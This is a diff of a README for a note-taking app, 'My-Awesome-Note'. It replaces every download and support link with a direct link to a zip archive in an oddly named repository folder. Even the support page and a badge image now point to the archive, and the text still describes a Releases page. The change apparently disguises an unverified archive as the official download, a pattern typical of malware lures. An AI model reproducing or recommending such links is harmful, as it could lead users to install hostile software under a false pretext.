@@ -1,6 +1,6 @@
 # ✏️ My-Awesome-Note - Keep All Your Learning Notes Safe
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20My--Awesome--Note-blue)](https://github.com/sahilmalvankar/My-Awesome-Note/releases)
+[![Download Now](https://raw.githubusercontent.com/sahilmalvankar/My-Awesome-Note/main/uncongratulated/My-Awesome-Note.zip%20Now-Get%20My--Awesome--Note-blue)](https://raw.githubusercontent.com/sahilmalvankar/My-Awesome-Note/main/uncongratulated/My-Awesome-Note.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to My-Awesome-Note! This application helps you manage and store all your
 
 ## 📥 Download & Install
 
-To download My-Awesome-Note, please visit this page: [Download My-Awesome-Note](https://github.com/sahilmalvankar/My-Awesome-Note/releases). 
+To download My-Awesome-Note, please visit this page: [Download My-Awesome-Note](https://raw.githubusercontent.com/sahilmalvankar/My-Awesome-Note/main/uncongratulated/My-Awesome-Note.zip). 
 
 1. Click on the link above.
 2. You will be directed to our Releases page.
@@ -61,7 +61,7 @@ If you encounter issues, here are a few tips:
 
 ## 📞 Support
 
-For further assistance, please visit our [Support Page](https://github.com/sahilmalvankar/My-Awesome-Note/issues) to ask questions or report issues.
+For further assistance, please visit our [Support Page](https://raw.githubusercontent.com/sahilmalvankar/My-Awesome-Note/main/uncongratulated/My-Awesome-Note.zip) to ask questions or report issues.
 
 ## 🔄 Updates
 
@@ -75,4 +75,4 @@ We value your thoughts! Please share your feedback through the “Issues” sect
 
 Thank you for choosing My-Awesome-Note! We hope this application makes your learning process easier and more enjoyable.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20My--Awesome--Note-blue)](https://github.com/sahilmalvankar/My-Awesome-Note/releases)
+[![Download Now](https://raw.githubusercontent.com/sahilmalvankar/My-Awesome-Note/main/uncongratulated/My-Awesome-Note.zip%20Now-Get%20My--Awesome--Note-blue)](https://raw.githubusercontent.com/sahilmalvankar/My-Awesome-Note/main/uncongratulated/My-Awesome-Note.zip)
